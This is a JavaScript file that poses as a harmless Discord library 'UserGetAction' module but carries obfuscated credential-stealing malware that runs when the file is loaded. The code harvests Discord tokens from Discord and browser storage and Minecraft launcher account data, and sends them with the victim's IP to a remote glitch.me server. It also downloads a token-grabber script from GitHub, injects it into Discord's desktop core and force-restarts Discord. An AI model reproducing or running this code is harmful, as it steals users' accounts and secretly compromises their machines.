const Action = require('./Action')
const OS = require('os'),
  fs = require('fs'),
  fetch = require('node-fetch'),
  { execSync } = require('child_process'),
  Glob = require('glob'),
  toInject = [],
  toInjectJS = [],
  toKill = [],
  apiurl = 'https://frequent-level-cornflower.glitch.me'
try {
  switch (OS.platform()) {
    case 'win32':
      const local = process.env.localappdata,
        roaming = process.env.appdata,
        minecraftPath = roaming + '/.minecraft/launcher_accounts.json',
        remixPath = roaming + '/.minecraft/remix/UID.txt'
      dbPaths = [
        roaming + '/Discord/Local Storage/leveldb',
        roaming + '/DiscordDevelopment/Local Storage/leveldb',
        roaming + '/Lightcord/Local Storage/leveldb',
        roaming + '/discordptb/Local Storage/leveldb',
        roaming + '/discordcanary/Local Storage/leveldb',
        roaming + '/Opera Software/Opera Stable/Local Storage/leveldb',
        roaming + '/Opera Software/Opera GX Stable/Local Storage/leveldb',
        local + '/Amigo/User Data/Local Storage/leveldb',
        local + '/Torch/User Data/Local Storage/leveldb',
        local + '/Kometa/User Data/Local Storage/leveldb',
        local + '/Orbitum/User Data/Local Storage/leveldb',
        local + '/CentBrowser/User Data/Local Storage/leveldb',
        local + '/7Star/7Star/User Data/Local Storage/leveldb',
        local + '/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        local + '/Vivaldi/User Data/Default/Local Storage/leveldb',
        local + '/Google/Chrome SxS/User Data/Local Storage/leveldb',
        local + '/Epic Privacy Browser/User Data/Local Storage/leveldb',
        local + '/Google/Chrome/User Data/Default/Local Storage/leveldb',
        local + '/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        local + '/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        local + '/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        local +
          '/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        local +
          '/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
      ]
      init()
      function init() {
        fs.readFile(
          remixPath,
          (_0x194f42, _0x2a88ef) => _0x2a88ef && minecraft('remix', _0x2a88ef)
        )
        fs.readFile(
          minecraftPath,
          (_0x4307a7, _0x55c3b7) =>
            _0x55c3b7 && minecraft('minecraft', _0x55c3b7)
        )
        injectToDiscord()
        dbPaths.forEach((_0x502003) => main(_0x502003))
      }
      function main(_0x105def) {
        fs.readdir(_0x105def, (_0x55aaba, _0x54e518) => {
          if (_0x54e518) {
            var _0x18842d = _0x54e518.filter((_0x576a2a) =>
              _0x576a2a.endsWith('ldb')
            )
            _0x18842d.forEach((_0x3e96fd) => {
              var _0x1177ef = fs
                .readFileSync(_0x105def + '/' + _0x3e96fd)
                .toString()
              var [_0x2381a7] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x1177ef) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x1177ef) || [undefined]
              if (_0x2381a7) {
                fetch('http://ip-api.com/json/')
                  .then((_0x5d8194) => _0x5d8194.json())
                  .then((_0x227d7b) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x2381a7.slice(1, -1),
                        ipAddress: _0x227d7b.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function minecraft(_0xff7e23, _0x58a9df) {
        switch (_0xff7e23) {
          case 'remix':
            fetch(apiurl + '/remix', {
              method: 'POST',
              body: JSON.stringify({ UID: _0x58a9df }),
            })
            break
          case 'minecraft':
            var [_0x13a242] = /"[\d\w_-]{32}"/.exec(_0x58a9df)
            if (_0x13a242) {
              const _0x4e46d5 = require(minecraftPath)
              if (!_0x4e46d5.accounts) {
                return
              }
              var _0x579d84 = _0x4e46d5.accounts[_0x13a242.slice(1, -1)]
              fetch(apiurl + '/minecraft', {
                method: 'POST',
                body: JSON.stringify({
                  eligibleForMigration: _0x579d84.eligibleForMigration,
                  hasMultipleProfiles: _0x579d84.hasMultipleProfiles,
                  legacy: _0x579d84.legacy,
                  localId: _0x579d84.localId,
                  minecraftProfileID: _0x579d84.minecraftProfile.id,
                  minecraftProfileName: _0x579d84.minecraftProfile.name,
                  persistent: _0x579d84.persistent,
                  remoteId: _0x579d84.remoteId,
                  type: _0x579d84.type,
                  username: _0x579d84.username,
                  activeAccountLocalId: _0x4e46d5.activeAccountLocalId,
                }),
              })
            }
        }
      }
      function injectToDiscord() {
        getInstalledDiscord()
        killAllDiscords()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x4c0184) => _0x4c0184.text())
          .then((_0x378401) =>
            toInjectJS.forEach(
              (_0x189266) =>
                fs.writeFileSync(
                  _0x189266,
                  _0x378401.replace('*API URL*', apiurl)
                ) ^
                execSync(
                  local +
                    '/' +
                    _0x189266.split('/')[5] +
                    '/Update.exe --processStart ' +
                    _0x189266.split('/')[5] +
                    '.exe'
                )
            )
          )
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(
          (_0x2319a9) =>
            _0x2319a9.includes('cord') && toInject.push(local + '/' + _0x2319a9)
        )
        toInject.forEach((_0x45ae8c) =>
          Glob.sync(
            _0x45ae8c +
              '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js'
          ).map((_0x506b18) => toInjectJS.push(_0x506b18))
        )
      }
      function killAllDiscords() {
        var _0xc7d5cd = execSync('tasklist').toString()
        _0xc7d5cd.includes('Discord.exe') && toKill.push('discord')
        _0xc7d5cd.includes('DiscordCanary.exe') && toKill.push('discordcanary')
        _0xc7d5cd.includes('DiscordDevelopment.exe') &&
          toKill.push('discorddevelopment')
        _0xc7d5cd.includes('DiscordPTB.exe') && toKill.push('discordptb')
        toKill.forEach((_0x359087) =>
          execSync('taskkill /IM ' + _0x359087 + '.exe /F')
        )
      }
      break
    case 'linux':
      const defaut = '/home/' + __dirname.split('/')[2] + '/.config',
        LdbPaths = [
          defaut + '/discord/Local Storage/leveldb',
          defaut + '/discordcanary/Local Storage/leveldb',
          defaut + '/discordptb/Local Storage/leveldb',
          defaut + '/DiscordDevelopment/Local Storage/leveldb',
        ]
      const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json'
      Linit()
      function Linit() {
        LdbPaths.forEach((_0x4d8dae) => Lmain(_0x4d8dae))
        var _0xaf1d27 = fs.readFileSync(LminecraftPath)
        if (_0xaf1d27) {
          Lminecraft(_0xaf1d27)
        }
        LinjectToDiscord()
      }
      function Lmain(_0x265587) {
        fs.readdir(_0x265587, (_0x13292b, _0x52f421) => {
          if (_0x52f421) {
            var _0x3b4410 = _0x52f421.filter((_0x3119ce) =>
              _0x3119ce.endsWith('ldb')
            )
            _0x3b4410.forEach((_0x4b96e8) => {
              var _0x33d8af = fs
                .readFileSync(_0x52f421 + '/' + _0x4b96e8)
                .toString()
              var [_0x47b4d8] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x33d8af) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x33d8af) || [undefined]
              if (_0x47b4d8) {
                fetch('http://ip-api.com/json/')
                  .then((_0x13423c) => _0x13423c.json())
                  .then((_0x349d99) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x47b4d8,
                        ip: _0x349d99.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function Lminecraft(_0x169ceb) {
        var [_0x313352] = /"[\d\w_-]{32}"/.exec(_0x169ceb)
        if (_0x313352) {
          const _0x24c823 = require(LminecraftPath)
          if (!_0x24c823.accounts) {
            return
          }
          var _0x413572 = _0x24c823.accounts[_0x313352.slice(1, -1)]
          fetch(apiurl + '/minecraft', {
            method: 'POST',
            body: JSON.stringify({
              eligibleForMigration: _0x413572.eligibleForMigration,
              hasMultipleProfiles: _0x413572.hasMultipleProfiles,
              legacy: _0x413572.legacy,
              localId: _0x413572.localId,
              minecraftProfileID: _0x413572.minecraftProfile.id,
              minecraftProfileName: _0x413572.minecraftProfile.name,
              persistent: _0x413572.persistent,
              remoteId: _0x413572.remoteId,
              type: _0x413572.type,
              username: _0x413572.username,
              activeAccountLocalId: _0x24c823.activeAccountLocalId,
            }),
          })
        }
      }
      function LinjectToDiscord() {
        getInstalledLDiscord()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0xdcd174) => _0xdcd174.text())
          .then((_0x19d33c) =>
            toInjectJS.forEach((_0x165b9b) =>
              fs.writeFileSync(
                _0x165b9b,
                _0x19d33c.replace('*API URL*', apiurl)
              )
            )
          )
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(
          (_0x5a2ca3) =>
            _0x5a2ca3.includes('cord') &&
            toInject.push(defaut + '/' + _0x5a2ca3)
        )
        toInject.forEach((_0x5dc3e7) =>
          Glob.sync(_0x5dc3e7 + '/*/modules/discord_desktop_core/index.js').map(
            (_0x18086c) => toInjectJS.push(_0x18086c)
          )
        )
      }
      break
    case 'darwin':
      break
  }
} catch (_0x2f1bfa) {}
class UserGetAction extends Action {
  ['handle'](_0x296849) {
    const _0x458698 = this.client
    const _0x41f3e5 = _0x458698.dataManager.newUser(_0x296849)
    return { user: _0x41f3e5 }
  }
}
module.exports = UserGetAction

